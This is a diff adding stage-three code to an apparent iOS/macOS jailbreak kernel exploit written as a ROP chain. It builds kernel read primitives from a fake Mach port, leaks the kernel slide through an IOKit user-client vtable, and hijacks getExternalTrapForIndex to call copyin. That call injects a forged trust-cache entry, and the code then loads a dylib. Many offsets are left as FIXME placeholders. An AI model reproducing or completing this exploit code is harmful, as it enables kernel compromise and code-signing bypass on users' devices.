@@ -1,7 +1,7 @@
 #include "common.h"
 #include "rop.h"
 #include "stage3.h"
-
+#include <mach/mach.h>
 
 typedef struct {
 	mach_msg_header_t head;
@@ -609,7 +609,7 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	// TODO: spawn racer thread here
 	
 	// SETUP VARS
-	char * tmp = malloc(100);
+	char * tmp = malloc(0x1000);
 	DEFINE_ROP_VAR("msg_port",sizeof(mach_port_t),tmp); // the port which we use to send and recieve the message
 	DEFINE_ROP_VAR("tmp_port",sizeof(mach_port_t),tmp); // the port which has to be in the message which we send to the kernel
 	DEFINE_ROP_VAR("the_one",sizeof(mach_port_t),tmp); // the port to which we have a fakeport in userland
@@ -658,6 +658,25 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	SET_ROP_VAR64_TO_VAR_W_OFFSET("dict",2*4,"fakeport",0); // overwrite 0xaa..bb with the address of our fakeport
 
 	DEFINE_ROP_VAR("self",sizeof(mach_port_t),&tmp);
+
+
+	// setup new trustcache struct
+	typedef char hash_t[20];
+	struct trust_chain {
+		uint64_t next;
+		unsigned char uuid[16];
+		unsigned int count;
+		hash_t hash[0];
+	};
+	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
+	snprintf(&new_entry->uuid,16,"TURNDOWNFORWHAT?");
+	new_entry->count = 1;
+	// FIXME: set hash here
+	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
+
+	char * dylib_str = malloc(100);
+	snprintf(dylib_str,100,"FIXME");
+	DEFINE_ROP_VAR("dylib_str",strlen(dylib_str)+1,dylib_str);
 
 	char * wedidit_msg = malloc(100);
 	snprintf(wedidit_msg,100,"WE DID IT\n");
@@ -729,6 +748,153 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	CALL("puts",0,0,0,0,0,0,0,0);
 
 	CALL("sleep",10000,0,0,0,0,0,0,0);
+
+	// get kernel slide
+	// alloc new valid port 
+	DEFINE_ROP_VAR("notification_port",sizeof(mach_port_t),tmp);
+	ROP_VAR_ARG64("self",1);
+	ROP_VAR_ARG("notification_port",3);
+	CALL("_kernelrpc_mach_port_allocate_trap",0,MACH_PORT_RIGHT_RECEIVE,0,0,0,0,0,0);
+
+	// set notification port on our fake port so that we can read back the pointer
+	ROP_VAR_ARG64("self",1);
+	ROP_VAR_ARG64("the_one",2);
+	ROP_VAR_ARG64("notification_port",5);
+	ROP_VAR_ARG64("tmp_port",7);
+	CALL("mach_port_request_notification",0,0,MACH_NOTIFY_PORT_DESTROYED, 0, 0, MACH_MSG_TYPE_MAKE_SEND_ONCE,0,0);
+
+	// get the heap addr
+	DEFINE_ROP_VAR("heap_addr",sizeof(uint64_t),tmp);
+	ROP_VAR_CPY_W_OFFSET("fakeport",0 /*FIXME: this must be fakeport.ip_pdrequest*/,"heap_addr",0,sizeof(uint64_t));
+	
+	// setup kr32
+	DEFINE_ROP_VAR("ip_requests_buf",0x20,tmp);
+	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport", 0 /*FIXME: this must be fakeport.ip_requests*/,"ip_requests_buf",0);
+
+	DEFINE_ROP_VAR("out_sz",8,tmp);
+	SET_ROP_VAR64("out_sz",1);
+#define kr32_raw(addr_var,valuename,offset) \
+	SET_ROP_VAR64_TO_VAR_W_OFFSET("ip_requests_buf",0 /*FIXME: ipr_size offset*/,addr_var,offset); \
+	ROP_VAR_ARG64("self",1); \
+	ROP_VAR_ARG64("the_one",2); \
+	ROP_VAR_ARG(valuename,4); \
+	ROP_VAR_ARG("out_sz",5); \
+	CALL("mach_port_get_attributs",0,0,MACH_PORT_DNREQUESTS_SIZE, 0, 0,0,0,0);
+#define kr32(addr_var,valuename) kr32_raw(addr_var,valuename,0);
+
+	// setup kr64chr
+
+	DEFINE_ROP_VAR("tmp_32_val",8,tmp);
+#define kr64(addr_val,valuename) \
+	kr32_raw(addr_val,"tmp_32_val",4); \
+	kr32(addr_val,valuename); \
+	ROP_VAR_CPY_W_OFFSET(valuename,4,"tmp_32_val",0,4);	
+
+
+
+	// get recv addr from heap addr
+	DEFINE_ROP_VAR("recv_heap_addr",8,tmp);
+	DEFINE_ROP_VAR("heap_addr_recv_ptr",8,tmp);
+	SET_ROP_VAR64("heap_addr_recv_ptr",offsetof(kport_t,ip_receiver));
+	ROP_VAR_ADD("heap_addr_recv_ptr","heap_addr_recv_ptr","heap_addr");
+	kr64("heap_addr_recv_ptr","recv_heap_addr");
+
+	// get the task pointer from our recv addr
+	DEFINE_ROP_VAR("task_pointer",8,tmp);
+	DEFINE_ROP_VAR("heap_addr_task_ptr",8,tmp);
+	SET_ROP_VAR64("heap_addr_task_ptr",0 /*FIXME: is_task_offset*/);
+	ROP_VAR_ADD("heap_addr_task_ptr","heap_addr_task_ptr","recv_heap_addr");
+	kr64("heap_addr_task_ptr","task_pointer");
+
+
+	// register the client we have onto our task
+	ROP_VAR_ARG64("self",1);
+	ROP_VAR_ARG("client",2);
+	CALL("mach_ports_register",0,0,1,0,0,0,0,0);
+
+	// get the address of the client port
+	DEFINE_ROP_VAR("ip_kobject_client_port",8,tmp);
+	DEFINE_ROP_VAR("ip_kobject_ptr",8,tmp);
+	SET_ROP_VAR64("ip_kobject_ptr",0 /* FIXME: itk_registered offset*/);
+	ROP_VAR_ADD("ip_kobject_ptr","ip_kobject_ptr","task_pointer");
+	kr64("ip_kobject_ptr","ip_kobject_client_port");
+
+	// get the UC obj
+	DEFINE_ROP_VAR("kobj_client",8,tmp);
+	DEFINE_ROP_VAR("kobj_client_ptr",8,tmp);
+	SET_ROP_VAR64("kobj_client_ptr",offsetof(kport_t,ip_kobject));
+	ROP_VAR_ADD("kobj_client_ptr","kobj_client_ptr","ip_kobject_client_port");
+	kr64("kobj_client_ptr","kobj_client");
+
+	// get the VTAB
+	DEFINE_ROP_VAR("RootDomainUC_VTAB",8,tmp);
+	kr64("kobj_client","RootDomainUC_VTAB");
+
+	// get the slide
+	DEFINE_ROP_VAR("kslide",8,tmp);
+	SET_ROP_VAR64("kslide",(UINT64_MAX - 0 /*FIXME: unslid rootdomainUC vtab*/ + 1));
+	ROP_VAR_ADD("kslide","kslide","RootDomainUC_VTAB");
+
+	// fully setup trust chain entry now
+	DEFINE_ROP_VAR("bss_trust_chain_head",8,tmp);
+	DEFINE_ROP_VAR("bss_trust_chain_head_ptr",8,tmp);
+	SET_ROP_VAR64("bss_trust_chain_head_ptr",0 /*FIXME: trust chain head ptr*/);
+	ROP_VAR_ADD("bss_trust_chain_head_ptr","bss_trust_chain_head_ptr","kslide");
+	kr64("bss_trust_chain_head_ptr","bss_trust_chain_head");
+	SET_ROP_VAR64_TO_VAR_W_OFFSET("new_trust_chain_entry",offsetof(struct trust_chain,next),"bss_trust_chain_head",0);
+
+#define VTAB_SIZE 20
+	// setup fake vtab in userland
+	DEFINE_ROP_VAR("UC_VTAB",VTAB_SIZE*8,tmp);
+	DEFINE_ROP_VAR("tmp_uint64",8,tmp);
+	DEFINE_ROP_VAR("vtab_ptr",8,tmp);
+	ROP_VAR_CPY("vtab_ptr","RootDomainUC_VTAB",8);
+	// unroll that loop cause loops in ROP are inefficent
+	for (int i = 0; i < VTAB_SIZE; i++) {
+		kr64("vtab_ptr","tmp_uint64");
+		ROP_VAR_CPY_W_OFFSET("UC_VTAB",i*8,"tmp_uint64",0,8);
+		SET_ROP_VAR64("tmp_uint64",8);
+		ROP_VAR_ADD("vtab_ptr","vtab_ptr","tmp_uint64");
+	}
+
+	// turn the_one into a fake UC port
+	
+	// create a fake UC
+	DEFINE_ROP_VAR("fake_client",200,tmp);
+	SET_ROP_VAR64_TO_VAR_W_OFFSET("fake_client",0,"UC_VTAB",0);
+
+	// update fakeport as iokit obj
+	SET_ROP_VAR32_W_OFFSET("fakeport",IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT,offsetof(kport_t,ip_bits));
+
+#undef kr32
+#undef kr64
+
+	// insert new fake client
+	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport",offsetof(kport_t,ip_kobject),"fake_client",0);
+	
+	// patch getExternalTrapForIndex
+	SET_ROP_VAR64("tmp_uint64",0 /*FIXME: gadget_add_x0_x0_ret*/);
+	ROP_VAR_ADD("tmp_uint64","tmp_uint64","kslide");
+	ROP_VAR_CPY_W_OFFSET("UC_VTAB",(0xb7*8),"tmp_uint64",0,8);
+
+	// copyin new head
+	
+	// setup call primitive
+	DEFINE_ROP_VAR("copyin_func_ptr",8,tmp);
+	SET_ROP_VAR64("copyin_func_ptr",0 /*FIXME: copyin */);
+	ROP_VAR_ADD("copyin_func_ptr","copyin_func_ptr","kslide");
+	ROP_VAR_CPY_W_OFFSET("fake_client",0x48,"copyin_func_ptr",0,8);
+	// setup x0
+	ROP_VAR_CPY_W_OFFSET("fake_client",0x40,"bss_trust_chain_head_ptr",0,8);
+
+	// fire
+	ROP_VAR_ARG64("the_one",1);
+	ROP_VAR_ARG("new_trust_chain_entry",3);
+	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);
+	
+	// dlopen
+	ROP_VAR_ARG("dylib_str",1);
+	CALL("dlopen",0,0,0,0,0,0,0,0);
 
 	if (curr_rop_var != NULL) {
 		build_databuffer(offsets,rop_var_top);
